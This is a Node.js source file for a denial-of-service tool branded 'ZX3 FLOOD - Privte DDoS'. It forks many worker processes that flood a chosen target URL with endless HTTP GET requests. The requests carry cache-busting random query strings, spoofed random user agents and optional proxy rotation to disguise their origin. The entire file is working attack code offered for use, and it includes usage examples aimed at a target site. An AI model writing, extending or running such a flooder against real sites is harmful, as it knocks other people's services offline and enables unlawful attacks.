const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const axios = require('axios');
const fakeUa = require('fake-useragent');

const args = process.argv.slice(2);

if (args.length < 3) {
  console.log(`
______      ________
___  /___  ___|__  /
__  /__  |/_/__/_ < 
_  /___>  < ____/ / 
/____/_/|_| /____/  
                    
ZX3 FLOOD - Privte DDoS 
ZxS3C OWNS EVERYTHING  

Usage:
  node DDoS.js <URL> <TIME> <THREADS> [PROXY_FILE]

Example:
  node DDoS.js https://target.com 300 500
  node DDoS.js https://target.com 600 800 proxies.txt
  `);
  process.exit(1);
}

const TARGET   = args[0];
const TIME_SEC = parseInt(args[1]);
const THREADS  = parseInt(args[2]);
const PROXY_FILE = args[3] || null;

let proxies = [];

if (PROXY_FILE) {
  try {
    proxies = fs.readFileSync(PROXY_FILE, 'utf8')
      .split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0);
    console.log(`Loaded ${proxies.length} proxies`);
  } catch (err) {
    console.log(`Proxy file error: ${err.message}`);
    console.log("Continuing without proxies...");
  }
}

const ua = new fakeUa();

if (cluster.isMaster) {
  console.log(`
______      ________
___  /___  ___|__  /
__  /__  |/_/__/_ < 
_  /___>  < ____/ / 
/____/_/|_| /____/  
                    
ZX3 FLOOD - Privte DDoS 
ZxS3C OWNS EVERYTHING 

Target   : ${TARGET}
Time     : ${TIME_SEC} seconds
Workers  : ${THREADS}
Proxies  : ${proxies.length > 0 ? proxies.length : 'Direct connection'}
Cores    : Using up to ${Math.min(THREADS, os.cpus().length)}
  `);

  for (let i = 0; i < THREADS; i++) {
    cluster.fork();
  }

  setTimeout(() => {
    console.log('\nZX3 FLOOD FINISHED - TARGET FUCKED HARD');
    process.exit(0);
  }, TIME_SEC * 1000);

} else {
  async function attack() {
    while (true) {
      const proxy = proxies.length > 0 
        ? proxies[Math.floor(Math.random() * proxies.length)] 
        : null;

      const headers = {
        'User-Agent': ua.random,
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Accept': '*/*',
        'Connection': 'keep-alive',
      };

      const url = TARGET + '?' + Math.random().toString(36).substring(7);

      try {
        if (proxy && proxy.startsWith('http')) {
          const proxyUrl = new URL(proxy);
          const proxyConfig = {
            host: proxyUrl.hostname,
            port: parseInt(proxyUrl.port || 80),
            auth: proxyUrl.username ? `${proxyUrl.username}:${proxyUrl.password}` : undefined
          };
          await axios.get(url, {
            proxy: proxyConfig,
            headers: headers,
            timeout: 6000,
          });
        } else {
          await axios.get(url, {
            headers: headers,
            timeout: 6000,
          });
        }
      } catch (err) {
      }
    }
  }

  attack();
}